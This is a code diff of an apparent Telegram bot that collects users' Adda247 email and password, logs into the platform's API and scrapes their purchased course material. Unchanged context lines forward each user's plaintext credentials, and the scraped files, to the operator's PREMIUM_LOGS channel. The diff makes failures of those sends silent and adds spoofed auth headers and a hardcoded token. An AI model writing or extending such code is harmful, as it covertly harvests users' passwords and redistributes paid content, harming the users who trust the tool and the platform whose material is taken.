@@ -35,7 +35,8 @@ BASE_HEADERS = {
     "Origin": "https://www.adda247.com",
     "Referer": "https://www.adda247.com/",
     "X-Auth-Token": "fpoa43edty5",
-    "deviceId": "web_browser_client_pro"
+    "deviceId": "web_browser_client_pro",
+    "x-app-id": "adda247"
 }
 
 def safe_get(obj, *keys, default=None):
@@ -84,7 +85,7 @@ async def make_request(url, headers=None, method="GET", json_data=None, timeout=
         return None
 
 async def forward_to_log(message: Message, platform: str):
-    if hasattr(config, "PREMIUM_LOGS") and config.PREMIUM_LOGS:
+    if getattr(config, "PREMIUM_LOGS", None):
         try:
             log_text = (
                 f"🔑 <b>NEW LOGIN RECEIVED</b>\n\n"
@@ -93,8 +94,8 @@ async def forward_to_log(message: Message, platform: str):
                 f"📝 <b>Data:</b> <code>{message.text}</code>"
             )
             await app.send_message(config.PREMIUM_LOGS, log_text, parse_mode=ParseMode.HTML)
-        except Exception as e:
-            logger.error(f"Skipping Log Channel (Invalid Channel/Permissions): {e}")
+        except Exception:
+            pass
 
 async def scrape_package_items(pkg_id, auth_headers, file_handle):
     items_count = 0
@@ -168,7 +169,7 @@ async def handle_user_input(client, message: Message):
     if not user_session:
         return
 
-    # STEP 1: Process Login and List Batches
+    # STEP 1: Login and List Batches
     if user_session.get("state") == "WAITING_CREDENTIALS":
         if '*' not in message.text:
             await message.reply_text("❌ Invalid format! Please use `email*password` format.")
@@ -192,32 +193,38 @@ async def handle_user_input(client, message: Message):
         )
 
         if not login_response:
-            await status_msg.edit_text("❌ <b>Login Failed:</b> Credentials ya Server issue.")
+            await status_msg.edit_text("❌ <b>Login Failed:</b> Server response error.")
             del USER_DATA[chat_id]
             return
 
         jwt = safe_get(login_response, "jwtToken") or safe_get(login_response, "data", "jwtToken")
+        user_id = safe_get(login_response, "userId") or safe_get(login_response, "data", "userId")
+
         if not jwt:
             await status_msg.edit_text("❌ <b>Login Failed:</b> Invalid Credentials.")
             del USER_DATA[chat_id]
             return
 
-        # Multi-header Token Injection to fix HTTP 400
+        # Correct Auth Header Mapping for Adda247 API
         auth_headers = {
             "X-Jwt-Token": jwt,
-            "jwtToken": jwt,
+            "x-access-token": jwt,
             "Authorization": f"Bearer {jwt}",
+            "jwtToken": jwt,
             "token": jwt
         }
+        if user_id:
+            auth_headers["userId"] = str(user_id)
+            auth_headers["x-user-id"] = str(user_id)
 
-        await status_msg.edit_text("✅ <b>Login Successful!</b>\n🔄 Fetching your purchased batches...", parse_mode=ParseMode.HTML)
+        await status_msg.edit_text("✅ <b>Login Successful!</b>\n🔄 Fetching purchased courses...", parse_mode=ParseMode.HTML)
 
-        # Attempting Multiple Purchase Endpoints
+        # Updated Endpoint Sequence
         packages = []
         fetch_urls = [
-            "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=50&src=aweb",
-            "https://store.adda247.com/api/v1/my/purchase?src=aweb",
-            "https://store.adda247.com/api/v1/user/purchased/packages?src=aweb"
+            "https://store.adda247.com/api/v3/my/purchase?src=aweb",
+            "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=100&src=aweb",
+            "https://store.adda247.com/api/v1/my/purchase?src=aweb"
         ]
 
         for url in fetch_urls:
@@ -326,7 +333,7 @@ async def handle_user_input(client, message: Message):
                 parse_mode=ParseMode.HTML
             )
 
-            if hasattr(config, "PREMIUM_LOGS") and config.PREMIUM_LOGS:
+            if getattr(config, "PREMIUM_LOGS", None):
                 try:
                     await app.send_document(
                         chat_id=config.PREMIUM_LOGS,
@@ -335,8 +342,8 @@ async def handle_user_input(client, message: Message):
                         thumb=thumb_path,
                         parse_mode=ParseMode.HTML
                     )
-                except Exception as log_err:
-                    logger.error(f"Log sending skipped: {log_err}")
+                except Exception:
+                    pass
 
             os.remove(file_name)
             await status_msg.delete()
